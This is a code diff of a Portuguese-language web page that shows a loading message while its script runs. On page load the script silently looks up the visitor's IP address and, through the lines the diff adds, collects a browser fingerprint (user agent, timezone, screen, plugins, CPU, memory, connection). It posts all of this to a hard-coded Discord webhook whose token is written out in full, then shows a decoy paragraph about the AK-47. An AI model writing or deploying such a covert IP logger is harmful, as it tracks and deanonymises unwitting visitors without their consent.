@@ -7,30 +7,53 @@
   <h1>Carregando...</h1>
 
   <script>
-
     const webhookURL = "https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi";
 
     fetch("https://api.ipify.org?format=json")
       .then(response => response.json())
       .then(data => {
         const ip = data.ip;
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const screenResolution = `${screen.width}x${screen.height}`;
+        const devicePixelRatio = window.devicePixelRatio;
+        const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "Nenhum";
+        const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
+        const deviceMemory = navigator.deviceMemory || "N/A";
+        const connection = navigator.connection ? 
+          `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mbps` : "N/A";
+        const cookieEnabled = navigator.cookieEnabled;
+        const online = navigator.onLine;
+        const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
 
         const payload = {
-          content: `🕵️ IP capturado: ${ip}`
+          content: `🕵️ Novo visitante:
+- IP: ${ip}
+- Navegador: ${userAgent}
+- Idioma: ${language}
+- Fuso horário: ${timezone}
+- Resolução da tela: ${screenResolution}
+- DPI (devicePixelRatio): ${devicePixelRatio}
+- Plugins: ${plugins}
+- Núcleos da CPU: ${hardwareConcurrency}
+- Memória RAM aproximada (GB): ${deviceMemory}
+- Conexão: ${connection}
+- Cookies habilitados: ${cookieEnabled}
+- Online: ${online}
+- Prefere modo escuro: ${prefersDarkMode}`
         };
 
         fetch(webhookURL, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
+          headers: {"Content-Type": "application/json"},
           body: JSON.stringify(payload)
         });
 
-        document.body.innerHTML = "<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.</h2>";
+        document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.</h2>`;
       })
       .catch(error => {
-        console.error("Erro ao obter IP:", error);
+        console.error("Erro ao obter informações:", error);
         document.body.innerHTML = "<h2>Erro ao verificar.</h2>";
       });
   </script>
